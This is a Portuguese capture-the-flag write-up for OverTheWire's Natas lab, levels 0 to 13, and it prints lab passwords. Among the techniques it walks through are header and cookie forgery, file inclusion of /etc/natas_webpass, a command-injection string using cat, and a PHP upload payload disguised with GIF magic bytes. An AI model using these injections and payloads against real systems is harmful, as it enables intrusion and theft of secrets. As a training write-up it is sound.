# OverTheWire: Natas
> Write-Up
> 
> Levels 1-15

## Introdução
O [Natas](https://overthewire.org/wargames/natas/) é um de muitos desafios fornecidos pelo site [OverTheWire](https://overthewire.org/wargames/), este site tem foco em disponibilizar diversas atividades para aprender e praticar conhecimentos de [cybersegurança](https://tecnoblog.net/responde/o-que-e-ciberseguranca/). O OverTheWire conta com diversos desafios diferentes e seus respectivos níveis de dificuldade, além disso, cada desafio também é dividido em diferentes níveis, dificultando conforme o avanço.

Nessa write-up serão abordados os níveis 1 até o 15 do *Natas*, onde o foco é *[serverside web-security](https://lbodev.com.br/glossario/o-que-e-web-server-security/)*.

## Nível 0
> http://natas0.natas.labs.overthewire.org

Este é o nível introdutório do Natas, usado apenas para explanar como as atividades funcionam. Cada desafio possui um **usuário** e uma **senha**, o usuário é composto apenas por *"natas"* seguido do número do seu nível, logo, o usuário desse nível é *"natas0"*, por outro lado, as senhas são um conjunto de caracteres aleatórios, apenas com exceção do primeiro nível, onde a senha também é *"natas0"*.

Ao usar as credenciais e entrar no desafio vemos o seguinte texto:
> You can find the password for the next level on this page.
>
> "Você pode encontrar a senha para o próximo nível nesta página."

Apesar do que é dito na página, não há mais nada na página, porém podemos checar informações escondidas no [código-fonte](https://pt.wikipedia.org/wiki/C%C3%B3digo-fonte) das páginas, para acessá-lo podemos apertar o atalho no teclado *"CTRL+U"* ou usando o botão direito do mouse e indo em *"ver código-fonte da página"*.

Código-Fonte:

[![Natas0.png](https://i.postimg.cc/Z5dXgYgD/Natas0.png)](https://postimg.cc/4YX8HGXz)

Na imagem é visível as informações da página, porém, abaixo, vemos um comentário:
> The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
>
> "A senha para o natas1 é ..."

## Nível 1
> Usuário: natas1
>
> Senha: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
>
> http://natas1.natas.labs.overthewire.org

Ao usar o usuário e a senha encontrada no último desafio visitamos uma página com o seguinte texto:
> You can find the password for the next level on this page, but rightclicking has been blocked!
>
> "Você pode encontrar a senha para o próximo nível nesta página, mas o botão direto foi bloqueado!"

Assim como no último nível, é preciso checar o código-fonte da página, porém, como dito no texto do desafio, o botão direito do mouse foi bloqueado, para contornar isso podemos usar o atalho citado no último desafio: *"CTRL+U"*

Código-fonte:

[![natas1.png](https://i.postimg.cc/j25Kp00j/natas1.png)](https://postimg.cc/Fd22S6Kt)

Novamente, abaixo das informações dos itens da página, está um comentário:
> The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
>
> "A senha para o natas2 é ..."

## Nível 2
> Usuário: natas2
>
> Senha: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
>
> http://natas2.natas.labs.overthewire.org/

Ao acessar a página do desafio vemos o seguinte texto:
> There is nothing on this page 
>
> "Não há nada nessa página."

Se baseando nos últimos níveis, vamos checar o código-fonte dessa página.

Código-fonte:
[![natas2.png](https://i.postimg.cc/kX86wz9G/natas2.png)](https://postimg.cc/N5sjjNKv)

Dessa vez não há nenhum comentário nos dando a senha diretamente, porém, se observarmos a linha 15 do código é possível notar um **diretório** de uma imagem com o nome de *"pixel.png"*

> img src="files/pixel.png"

Ao acessar esse diretório nos deparamos com apenas um pixel branco e nada mais, poderíamos analisar melhor essa imagem, porém, também conseguimos acessar o diretório onde está a imagem  e ver que tipos de arquivos estão presentes.

/files:

[![files.png](https://i.postimg.cc/7h46RYqH/files.png)](https://postimg.cc/1nWsnSg2)

Além da imagem que já tinhamos visto, também encontramos um arquivo de texto com o nome de *"users.txt"*, ao acessá-lo vemos vários usuários e suas respectivas senhas:

```
usrname:password

alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Dentre esses usuários é possível ver um que nos interessa:
> natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

## Nível 3
> Usuário: natas3
>
> Senha: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
>
> http://natas3.natas.labs.overthewire.org

Ao entrar na página é possível observar que ela continua com a mesma aparência do último desafio, com o mesmo texto e nada mais:

> There is nothing on this page.
>
> "Não há nada nessa página."

Ao checar o código-fonte da página podemos ver o que mudou.

Código-fonte:

[![natas3.png](https://i.postimg.cc/jSg99p8z/natas3.png)](https://postimg.cc/HrMB8h1x)

Ao invés de um diretório agora temos um comentário:
> No more information leaks!! Not even Google will find it this time...
>
> "Sem mais vazamento de dados!! Nem o Google vai encontrar isso dessa vez...

Seguindo o mesmo raciocínio do último desafio, podemos concluir que a senha está em algum diretório escondido dessa página, podemos rodar uma ferramenta (*[dirb](https://www.kali.org/tools/dirb/)*) para testar todos os diretórios conhecidos, mas primeiramente, podemos testar manualmente diretórios de arquivos comuns em sites, como por exemplo:

```
/robots.txt
/sitemap.xml
/index.php
/index.html
/README ou /readme.txt
```

Ao testar esses diretórios, mais especificamente o **robots.txt**, somos encaminhados para uuma página onde só tem um pequeo texto indicando o diretório escondido que estávamos procurando:

> /s3cr3t/

Acessando esse diretório somos encaminhados para uma página de arquivos, onde novamente temos um arquivo de texto com o nome de *"users.txt"*.

/s3cr3t:

[![s3cr3t.png](https://i.postimg.cc/T2k5SQVh/s3cr3t.png)](https://postimg.cc/xqzdNvFS)

Acessando o arquivo de texto podemos ver apenas um usuário, *"natas4"*, e logo em seguida, a sua senha:

> natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

## Nível 4

> Usuário: natas4
> 
> Senha: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
> 
> http://natas4.natas.labs.overthewire.org

Acessando a página do próximo desafio, vemos a seguinte descrição:

> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
>
> "Acesso proibido. Você está visitando de "http://natas4.natas.labs.overthewire.org/" enquanto usuários autorizados devem visitar apenas de "http://natas5.natas.labs.overthewire.org/"

Ao que parece, essa página de desafio utiliza um controle de acesso baseado em *[headers HTTP](https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Reference/Headers)*, onde, a página verifica o nosso *header referer* que diz de qual site nos estamos visitando, e compara com o header que é permitido de acessar a página. Nesse caso, o *header* que queremos é a página do próximo desafio, porém, a senha para acessar o próximo desafio ainda não foi obtida.

Logicamente, precisamos de uma meio de alterar o nosso *header referer* para que ele diga que estamos vindo de outra página, para isso, utilizaremos o programa **[BurpSuite](https://blog.solyd.com.br/o-que-e-o-burp-suite/)**. Explicando brevemente: o BurpSuite é uma ferramenta usada para testar a segurança de aplicações web, ele funciona como um **proxy interceptador**, ou seja, ele fica entre o navegador e o servidor, permitindo a vizualização das requisições HTTP e respostas do site, também é possível usá-lo para editar diversas informações, dentre elas, os *headers* HTTP.

Primeiro precisamos abrir e configurar o BurpSuite, desse modo ele irá interceptar todas as requisições dos sites que nós visitarmos. Após configurá-lo podemos recarregar a página e checar a requisição:

BurpSuite:

[![Burp.png](https://i.postimg.cc/1XHjs2KN/Burp.png)](https://postimg.cc/JHsqQTv1)

Agora, podemos editar o *header referer* de *"http://natas4.natas.labs.overthewire.org/"* para *"http://natas5.natas.labs.overthewire.org/"*.

Ao modificar o header a página muda e mostra o seguinte texto:
>  Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
>
> "Acesso garantido. a senha para natas5 é ..."

## Nível 5

> Usuário: natas5
> 
> Senha: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
> 
> http://natas5.natas.labs.overthewire.org

Logando na página vemos o texto:

> Access disallowed. You are not logged in."
> 
> "Acesso negado. Você não está logado."

Esse texto é parte do desafio, visto que colocamos o usuário e a senha corretos. Ao **inspecionar** a página com o botão direito do mouse e indo em inspecionar (*CTRL+SHIFT+i*), podemos checar os [cookies](https://www.kaspersky.com.br/resource-center/definitions/cookies), visto que eles servem para gravar os dados de um usuário em páginas web.

Cookies:

[![Cookies-natas5.png](https://i.postimg.cc/qMgqpSkT/Cookies-natas5.png)](https://postimg.cc/7f8wVBGs)

Essa página de desafio tem três cookies, o último deles tem o nome de *"loggedin"* com o valor 0 (falso), ao editar esse valor para 1 (verdadeiro) e atualizar a página a mensagem muda:

> Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
> 
> "Acesso garantido. A senha para natas6 é ..."

## Nível 6

> Usuário: natas6
> 
> Senha: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
> 
> http://natas6.natas.labs.overthewire.org

Passando para o próximo desafio:

[![natas6.png](https://i.postimg.cc/HLt3TV2k/natas6.png)](https://postimg.cc/KKRtNcw6)

A página pede uma **senha** secreta e também oferece um botão pra ver o **código-fonte** da página.

Código-fonte:

[![codigo-natas6.png](https://i.postimg.cc/gjbvRpNP/codigo-natas6.png)](https://postimg.cc/tZDZQLKr)

No código-fonte é possível notar um código para validar a senha que for colocada, também podemos notar mais duas coisas, ao colocar a senha correta a página devolve a senha para o próximo desafio, que está censurada no código, e acima do código, sendo incluído como uma [biblioteca](https://pt.wikipedia.org/wiki/Biblioteca_(computa%C3%A7%C3%A3o)) temos um diretório de um arquivo:

> include "**includes/secret.inc**";

Esse diretório é de um arquivo de texto **.inc**, ao acessá-lo vemos a seguinte mensagem:

> $secret = "FOEIUWGHFEEUHOFUOIU";

Ao colocar a senha "$secret" na página:

> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 
> 
> "Acesso garantido. A senha para natas7 é ..."

## Nível 7

> Usuário: natas7
> 
> Senha: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
> 
> http://natas7.natas.labs.overthewire.org

Acessando a página não vemos um texto, porém vemos dois botões, um para acessar a página *"home"* e um para a página *"about"*. Em nenhuma das duas página há algo relevante, apenas o mesmo texto:

> this is the front/about page.
> 
> "Essa é a página front/about."

Ao checar o código-fonte de qualquer uma podemos ver uma dica.

Código-fonte:
[![codigo-natas7.png](https://i.postimg.cc/T1zyWJ9g/codigo-natas7.png)](https://postimg.cc/rR9yBW7w)

> hint: password for webuser natas8 is in /etc/natas_webpass/natas8
> 
> "dica: senha para webuser natas8 está em /etc/natas_webpass/natas8"

Ao tentar acessar o diretório fornecido vemos que a página não existe, porém ao verificar o link melhor podemos ver que a página funciona através de um [**script php**](https://www.hostinger.com/br/tutoriais/o-que-e-php-guia-basico)(*[file inclusion](https://soescola.com/glossario/o-que-e-file-inclusion#gsc.tab=0)), explicando brevemente, podemos utilizar de uma falha de segurança chamada no código do *"index.php"* para incluir  qualquer diretório de página que nós não conseguiríamos acessar normalmente.

Por exemplo, o link para a *front page* é:

> http://natas7.natas.labs.overthewire.org/index.php/etc/natas_webpass/index.php?page=home

Se trocarmos o *"home"* para o diretório que estamos procurando:

> http://natas7.natas.labs.overthewire.org/index.php/etc/natas_webpass/index.php?page=/etc/natas_webpass/natas8

Ao acessar essa página conseguimos a **senha** para o próximo desafio:

> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

## Nível 8

> Usuário: natas8
> 
> Senha: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
> 
> http://natas8.natas.labs.overthewire.org

Este desafio possui a mesma página do natas6, onde que requer uma senha para avançar para o próximo nível e um botão para checar o **código-fonte**.

Código-fonte:

[![codigo-natas8.png](https://i.postimg.cc/8zxSgkH9/codigo-natas8.png)](https://postimg.cc/pmQ7DH3J)

Precisamos fazer uma [engenharia reversa](https://pt.wikipedia.org/wiki/Engenharia_reversa) nó código de validação de senha.

```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
```

Vemos que a função *"encondedSecret"* pega a variável "$secret" (senha) e a codifca utilizando 3 métodos diferentes:

```
bin2hex(strrev(base64_encode($secret)));
```

> base64_encode() -> Base64
> 
> strrev() -> Reverte a string
> 
> bin2hex() -> Ascii

O código também nos da a *[string](https://soescola.com/glossario/o-que-e-string#gsc.tab=0)* já codificada, logo, ao decodifica-lá conseguiremos a senha. Como ferramenta de decodificação iremos usar o site **[Dcode](https://www.dcode.fr/en)**, mais especificamente suas ferramentas de [Base64](https://www.dcode.fr/base-64-encoding), [Reverse](https://www.dcode.fr/reverse-writing) e [ASCII](https://www.dcode.fr/ascii-code).

```
Mensagem criptografada: 3d3d516343746d4d6d6c315669563362

ASCII
3d3d516343746d4d6d6c315669563362 -> ==QcCtmMml1ViV3b

Reverse
==QcCtmMml1ViV3b -> b3ViV1lmMmtCcQ==

Base64
b3ViV1lmMmtCcQ== -> oubWYf2kBq
```

Agora que adquirimos a senha podemos simplesmente usá-la, fazendo isso conseguimos acesso ao próximo desafio.

> Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
> 
> "Acesso garantido. A senha para natas9 é ..."

## Nível 9

> Usuário: natas9
> 
> Senha: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
> 
> http://natas9.natas.labs.overthewire.org

No momento em que a página do desafio é exibida, vemos que se trata de uma ferramenta que lê um string e retorna palavras do dicionário que contém aquela string.

Natas 9:

[![natas9.png](https://i.postimg.cc/sX7GvJgF/natas9.png)](https://postimg.cc/njVhWBmT)

Por exemplo se usarmos a string "secret":
```
Output:

secret
secretarial
secretaries
secretary
secretary's
secrete
secreted
secreter
secretes
secretest
secreting
secretion
secretion's
secretions
secretive
secretly
secrets
```

Há também um botão para checar o código-fonte da página.

Código-fonte:

[![codigo-natas9.png](https://i.postimg.cc/Kcsh1hwJ/codigo-natas9.png)](https://postimg.cc/py86S42F)

Ao analisar o código podemos notar alguns pontos, o código usa como base um arquivo de texto com o nome de *dictionary.txt*, ele também usa um comando chamado "[grep](https://guialinux.uniriotec.br/grep/)" pela função *"[passthru](https://www.php.net/manual/en/function.passthru.php)"*. Essa função é importante pois podemos usá-la para fazer um "[command injection](https://flammadesign.com.br/glossario/o-que-e-command-injection-e-suas-implicacoes/)".

```
1   $key = "";
2   
3   if(array_key_exists("needle", $_REQUEST)) {
4       $key = $_REQUEST["needle"];
5   }
6   
7   if($key != "") {
8       passthru("grep -i $key dictionary.txt");
9   }
```

A função *"passthru"* é usada para executar comandos na página, assim como o grep, podemos executar um comando atráves da variável *"$key"* (input), logo, ao colocar um ponto e vírgula (;) no começo da string podemos separar o comando em duas partes, com a segunda parte sendo o comando que queremos utilizar.

Como visto no natas8, sabemos que as senhas ficam armazenadas no dirétório:

> /etc/natas_webpass/natas__ <- (número do desafio)

Podemos usar o comando [*"cat"*](https://www.hostinger.com/br/tutoriais/comando-cat-linux), que exibe o conteúdo de um arquivo em formato de texto.

> ;cat etc/natas_webpass/natas10;

Ao executar esse programa conseguimos a senha para o próximo desafio.

> t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

## Nível 10

> Usuário: natas10
> 
> Senha: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
> 
> http://natas10.natas.labs.overthewire.org/

Esse nível é bem similar ao último, com a única adição sendo um filtro de caracteres ao input.

Código-fonte:

[![codigo-natas10.png](https://i.postimg.cc/BbwpJ0ZW/codigo-natas10.png)](https://postimg.cc/jnPPhBJv)

Agora, não podemos usar ponto e vírgula (;) e nem "&" para executar mais de um comando no código, porém, ainda conseguimos achar uma maneira criativa de conseguirmos avançar de nível.

Sabemos que o diretório da senha continua o mesmo, vamos analisar a função passthru com atenção:

```
passthru("grep -i $key dictionary.txt");

passthru() -> função que executa um comando.
grep -i -> programa que encontra padrões em arquivos de texto.
$key -> variável de input.
dictionary.txt -> arquivo de texto com palavras do dicionário.
```

Tendo como base outros desafios, sabemos que a senha é sempre uma string aleatória de letras e números, logo, ao invés de usar dois comandos, podemos usar apenas o grep para encontrar uma letra qualquer na senha. Por exemplo, se digitarmos:

> a /etc/natas_webpass/natas11

O comando completo que o código iria executar seria:

> grep -i a /etc/natas_webpass/natas11 dictionary.txt

Com isso, o programa grep irá procurar a letra "a" no diretório onde está a senha e no dictionary.txt, se a senha conter a letra "a" ela será retornada para nós junto com todas as palavras que também contém a letra "a" em sua escrita.

Ao executar o comando:

```
Output:

/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
...
```
> UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

## Nível 11

> Usuário: natas11
> 
> Senha: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
> 
> http://natas11.natas.labs.overthewire.org/

Ao logar no desafio vemos algo de diferente:

[![natas11.png](https://i.postimg.cc/PqNzXqVW/natas11.png)](https://postimg.cc/CZTfJwg5)

Esse desafio oferece a opção de trocar a cor de fundo da página (na imagem está preto, mas é por causa de uma extensão do meu navegador), além disso, uma frase que diz que os [cookies](https://www.kaspersky.com.br/resource-center/definitions/cookies) da página são protegidos com criptografia *[XOR](https://kfcdicasdigital.com/glossario/o-que-e-codificacao-xor-codificacao-xor/)*, também temos um botão para conferir o código-fonte.

O código dessa página é bem maior do que o dos outros níveis, então, aqui está apenas o que há de relevante para esse desafio:

```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

Analisando esse código em partes:

```
1   $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
2   
3   function xor_encrypt($in) {
4       $key = '<censored>';
5       $text = $in;
6       $outText = '';
7   
8       // Iterate through each character
9       for($i=0;$i<strlen($text);$i++) {
10      $outText .= $text[$i] ^ $key[$i % strlen($key)];
11      }
12
13      return $outText;
14      }
``` 

Na linha 1 podemos notar uma variável [booleana](https://pt.wikipedia.org/wiki/Boolean), *"showpassword"*, com o valor negativo, além disso, abaixo da linha 3 temos uma função de criptografia XOR, com a chave censurada, indicando que ela é uma informação importante nesse desafio.

```
1   function loadData($def) {
2       global $_COOKIE;
3       $mydata = $def;
4       if(array_key_exists("data", $_COOKIE)) {
5       $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
6       if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
7           if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
8           $mydata['showpassword'] = $tempdata['showpassword'];
9           $mydata['bgcolor'] = $tempdata['bgcolor'];
10          }
11      }
12      }
13      return $mydata;
14  }
15
16  function saveData($d) {
17      setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
18  }
```

Agora vemos outras funções, porém o que realmente importa nesse código é a segunda função na linha 16, "saveData", nela podemos ver que o valor do cookie e encriptado em XOR e logo após em Base64.

```
1   $data = loadData($defaultdata);
2
3   if(array_key_exists("bgcolor",$_REQUEST)) {
4       if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
5           $data['bgcolor'] = $_REQUEST['bgcolor'];
6       }
7   }
8
9   saveData($data);
10
11  if($data["showpassword"] == "yes") {
12      print "The password for natas12 is <censored><br>";
13  }

```

Agora, vemos uma parte do código que verifica a sintaxe da entrada e muda a cor do fundo da página, abaixo dela, na linha 11, temos um operador lógico (if) que diz que se a variável "showpassword" estiver positiva, ele irá imprimir a senha para o próximo desafio.

Já que coletamos todas essas informações podemos concluir que devemos trocar o valor da variável "showpassword", para isso, primeiro temos que descriptografar o cookie que guarda o valor dessa variável junto com o valor da cor de fundo e modificá-lo.

> HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D

Cookies são enviados por [HTTP](https://pt.wikipedia.org/wiki/HTTP), por isso, antes temos que decodificá-lo pois ele não suporta símbolos como ";,+,/" e principalmente "=", o sinal de igual está presente no final de toda string criptograda em base64 então trocamos o "%3D" por "=". ([URL encoding](https://en.wikipedia.org/wiki/Percent-encoding))

> HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=

Como ferramenta de descriptografia vamos novamente usar o site [CyberChef](https://cyberchef.io), assim como no natas 8.

CyberChef:

[![cyberchef-natas11.png](https://i.postimg.cc/cHy0cXj4/cyberchef-natas11.png)](https://postimg.cc/Y435rfMJ)

Para a próxima parte é preciso entender como funciona XOR, resumidamente, o XOR funciona com um texto plano e uma chave, a chave é usada para criptografar o texto plano ou vice-versa, no código temos uma dica de qual é o texto plano:

> $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

Vemos que o texto plano é formado pela variável "showpassword" e seu valor mais a variável que define a cor de fundo "bgcolor" e seu valor. em outra linha:

> setcookie("data", base64_encode(xor_encrypt(json_encode($d))));

O texto plano, antes de ser criptografado em XOR e em base64, é formatado em [JSON](https://devsemmedo.com.br/json-o-que-e-para-que-serve-e-como-funciona/), então vamos pegar o texto em [PHP](https://pt.wikipedia.org/wiki/PHP) (código da página) e passá-lo para JSON utilizando o site [funtions-online](https://www.functions-online.com) e sua ferramenta de [JSON enconde](https://www.functions-online.com/json_encode.html).

Functions-online

[![JSON-natas11.png](https://i.postimg.cc/Yqs6CWZN/JSON-natas11.png)](https://postimg.cc/tYFZrYX7)

> {"showpassword":"no","bgcolor":"#ffffff"}

Agora que temos o texto plano e a mensagem criptografada, voltaremos para o CyberChef e usaremos o texto plano para encontrar chave de criptografia XOR que foi utilizada no desafio:

CyberChef:

[![Cybeer-Chef-natas11.png](https://i.postimg.cc/J0cRdZJ3/Cybeer-Chef-natas11.png)](https://postimg.cc/vxTR410D)

> eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe

(Lembre-se de trocar a configuração do XOR, ela deve estar em [UTF-8](https://informatecdigital.com/pt/o-que-%C3%A9-utf-8/))

A chave é "eDWo", ela se repete conforme o tamanho da string criptografada. Já que conseguimos a chave, podemos reescrever a string com o valor de "showpassword" positivo, fazer novamente o processo de criptografia e trocar o valor do cookie, desse jeito, ao recarregar a página a senha é imprimida.

> {"showpassword":"yes","bgcolor":"#ffffff"}

CyberChef:

[![cybeeerchef-natas11.png](https://i.postimg.cc/0jgpCRGX/cybeeerchef-natas11.png)](https://postimg.cc/sQcQVLN5)

> HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5

Ao trocar o valor do cookie:

> The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

## Nível 12

> Usuário: natas12
> 
> Senha: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
> 
> http://natas12.natas.labs.overthewire.org/

Diferente do último desafio, esse é mais simples:

Página do desafio:

[![natas12.png](https://i.postimg.cc/QtTX4Wkf/natas12.png)](https://postimg.cc/0M9Rrj4S)

Esse desafio consiste em um *upload* de um arquivo de imagem [.JPEG](https://pt.wikipedia.org/wiki/JPEG), também há um botão para checar o código fonte da página:

Código-fonte:

```
php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```

O que há de relevante nesse código, além da função de *upload*, é que qualquer arquivo que passarmos para a página terá o nome trocado por uma string aleatória e será mudado para *.JPEG*.

Agora que temos essas informações é evidente que precisamos de um [payload](https://www.scaler.com/topics/cyber-security/what-are-payloads/), vamos carregar o payload para acessar o diretório em que está a senha, aquele mesmo que utilizamos nos últimos desafios:

> /etc/natas_webpass/natas13

Primeiro, precisamos de um arquivo *[.PHP](https://pt.wikipedia.org/wiki/PHP)* com um *[script](https://pt.wikipedia.org/wiki/Linguagem_de_script)* para acessar o diretório da senha, ao pesquisar conseguimos chegar ao seguinte *script*:

> ?php echo file_get_contents('/etc/natas_webpass/natas13'); ?

Lembrando que o arquivo possui "< >" no começo e no final. O payload está pronto, porém, ainda precisamos contornar a mudança de arquivo presente no código, para isso, vamos utilizar um proxy do [BurpSuite](https://blog.solyd.com.br/o-que-e-o-burp-suite/) para interceptar as requisições da página e trocar o formato do arquivo manualmente.

BurpSuite:

[![Burp-natas12.png](https://i.postimg.cc/rydDtKB4/Burp-natas12.png)](https://postimg.cc/hhBDkPP4)

> 47qifp9780.jpg -> 47qifp9780.php

Ao enviar a requisição e abrir a página novamente vemos que o payload foi carregado com êxito, ao apertar no link do arquivo a senha é imprimida na tela:

> trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

## Nível 13

> Usuário: natas13
> 
> Senha: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
> 
> http://natas13.natas.labs.overthewire.org/

Este desafio é bem similar ao último, porém, com mais táticas de segurança. A página possui uma função de upload de imagens novamente e um novo enunciado:

> For security reasons, we now only accept image files!
> 
> "Por razões de segurança, nós agora só aceitamos arquivos de imagem.

Vamos checar o código-fonte da página para verificar o meio em que o site verifica o upload.

```
1	function genRandomString() {
2	    $length = 10;
3	    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
4	    $string = "";
5	
6	    for ($p = 0; $p < $length; $p++) {
7	        $string .= $characters[mt_rand(0, strlen($characters)-1)];
8	    }
9	
10	    return $string;
11	}
12	
13	function makeRandomPath($dir, $ext) {
14	    do {
15	    $path = $dir."/".genRandomString().".".$ext;
16	    } while(file_exists($path));
17	    return $path;
18	}
19	
20	function makeRandomPathFromFilename($dir, $fn) {
21	    $ext = pathinfo($fn, PATHINFO_EXTENSION);
22	    return makeRandomPath($dir, $ext);
23	}
24	
25	if(array_key_exists("filename", $_POST)) {
26	    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
27	
28	    $err=$_FILES['uploadedfile']['error'];
29	    if($err){
30	        if($err === 2){
31	            echo "The uploaded file exceeds MAX_FILE_SIZE";
32	        } else{
33	            echo "Something went wrong :/";
34	        }
35	    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
36	        echo "File is too big";
37	    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
38	        echo "File is not an image";
39	    } else {
40	        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
41	            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
42	        } else{
43	            echo "There was an error uploading the file, please try again!";
44	        }
45	    }
46	}

```

Podemos ver que o código, na linha 37, utiliza a função *"exif_imagetype()*", essa função checa os primeiros *[bytes](https://pt.wikipedia.org/wiki/Byte)* do arquivo que indicam o tipo de arquivo e se ele é uma imagem, esses *bytes* também são conhecidos por *[magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)*.
Por sorte, essa função é facilmente contornável, apenas precisamos colocar o nome do tipo de arquivo em primeiro no conteúdo do *payload*, nesse caso, precisamos de um arquivo de imagem, vamos checar na internet por nomes de arquivos de imagens:

[Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures):

[![Magic-b-natas13.png](https://i.postimg.cc/kXHHThGg/Magic-b-natas13.png)](https://postimg.cc/F7jGRp0M)

Ao verificar a *wikipedia*, vemos que o um nome simples para adicionar é o de um [GIF](https://pt.wikipedia.org/wiki/GIF), logo podemos simplesmente adicionar o nome desse gif, "GIF87a", no início do payload:

> GIF87a<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?

Lembrando que ao final do arquivo temos um ">". Agora, repetimos o processo do último desafio, fazemos o *upload*, ligamos o *proxy* e utilizamos o *BurpSuite* para editar manualmente o formato do *payload*, voltamos para página, acessamos o *link* do arquivo e adiquirimos a senha:

BurpSuite:

[![Burp-natas-13.png](https://i.postimg.cc/52v7XbVD/Burp-natas-13.png)](https://postimg.cc/LJ9B7dhV)

> 3yygwojr6t.jpg -> 3yygwojr6t.php

Página do desafio:

